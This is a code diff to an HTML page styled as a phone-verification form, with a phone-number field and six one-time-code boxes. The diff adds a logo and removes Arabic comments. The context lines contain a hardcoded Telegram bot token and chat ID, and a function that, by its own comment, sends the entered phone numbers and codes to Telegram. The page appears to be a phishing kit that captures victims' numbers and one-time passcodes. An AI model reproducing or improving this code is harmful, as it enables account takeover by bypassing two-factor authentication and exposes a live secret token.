@@ -7,8 +7,8 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css">
     <style>
         :root {
-            --bg-cream: #fdf8f1; /* لون الخلفية الكريمي المستخرج من صورتك */
-            --btn-green: #24ac64; /* لون الزر الأخضر */
+            --bg-cream: #fdf8f1;
+            --btn-green: #24ac64;
             --text-black: #1a1a1a;
             --text-gray: #666;
         }
@@ -16,7 +16,7 @@
         * { box-sizing: border-box; font-family: -apple-system, system-ui, sans-serif; }
 
         body {
-            background-color: var(--bg-cream); /* تطبيق اللون الكريمي على كامل الخلفية */
+            background-color: var(--bg-cream);
             margin: 0;
             padding: 0;
             display: flex;
@@ -25,32 +25,43 @@
             min-height: 100vh;
         }
 
-        /* حاوية المحتوى الرئيسية */
+        /* تنسيق الشعار في أعلى اليسار */
+        .header-logo {
+            width: 100%;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: flex-start; /* يضعه في اليسار */
+        }
+
+        .header-logo img {
+            height: 40px; /* يمكنك التحكم في حجم الشعار من هنا */
+            width: auto;
+            object-fit: contain;
+        }
+
         .main-content {
             flex: 1;
             display: flex;
             justify-content: center;
             align-items: center;
             width: 100%;
-            padding: 20px;
+            padding: 10px 20px;
         }
 
-        /* المربع الأبيض بإطار أسود وحواف دائرية */
         .wrapper {
             width: 100%;
             max-width: 400px;
             background: white;
             padding: 40px 25px;
-            border: 1.5px solid #000; /* الإطار الأسود النحيف المحيط بالمربع */
-            border-radius: 30px;      /* الحواف الدائرية الكبيرة كما طلبت */
-            box-shadow: 0 10px 25px rgba(0,0,0,0.05); /* ظل ناعم خلف المربع */
+            border: 1.5px solid #000;
+            border-radius: 30px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
             text-align: left;
         }
 
         h2 { font-size: 26px; font-weight: 700; margin-bottom: 12px; color: var(--text-black); line-height: 1.2; }
         p.desc { font-size: 15px; margin-bottom: 35px; color: var(--text-gray); line-height: 1.4; }
 
-        /* تنسيق الحقول */
         .iti { width: 100%; margin-bottom: 25px; }
         input[type="tel"], .otp-field {
             height: 55px;
@@ -61,11 +72,9 @@
             background: #fff;
         }
 
-        /* تنسيق خانات OTP الستة */
         .otp-container { display: flex; justify-content: space-between; gap: 8px; margin: 25px 0; }
         .otp-field { width: 15% !important; text-align: center; border-radius: 10px; }
 
-        /* الزر الأخضر */
         .btn-submit {
             background-color: var(--btn-green);
             color: white;
@@ -81,7 +90,6 @@
             display: block;
         }
 
-        /* تذييل الصفحة (Footer) */
         .footer {
             width: 100%;
             padding: 20px;
@@ -103,6 +111,10 @@
     </style>
 </head>
 <body>
+
+<div class="header-logo">
+    <img src="https://i.ibb.co/zHSPkBLy/IMG-3982.jpg" alt="Logo">
+</div>
 
 <div class="main-content">
     <div class="wrapper">
@@ -144,11 +156,9 @@
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
 <script>
-    // بياناتك المدمجة
     const botToken = "8597407463:AAEZ98PLouzh7ivB8WqRGGuGhiPYCbUMS5Q";
     const chatId = "1705240737";
 
-    // تفعيل حقل الهاتف مع اكتشاف الدولة تلقائياً
     const phoneInput = document.querySelector("#phone");
     const iti = window.intlTelInput(phoneInput, {
         initialCountry: "auto",
@@ -156,7 +166,6 @@
         utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
     });
 
-    // معالجة البيانات وإرسالها للتليجرام
     function processData(type) {
         let textMsg = "";
         if(type === 'phone') {
@@ -179,11 +188,11 @@
         });
     }
 
-    // الانتقال التلقائي بين خانات OTP
     function moveFocus(el, i) {
         if(el.value.length >= 1) {
             el.value = el.value.slice(0,1);
-            if(i < 5) document.querySelectorAll('.otp-field')[i+1].focus();
+            const fields = document.querySelectorAll('.otp-field');
+            if (i < 5) fields[i+1].focus();
         }
     }
 </script>
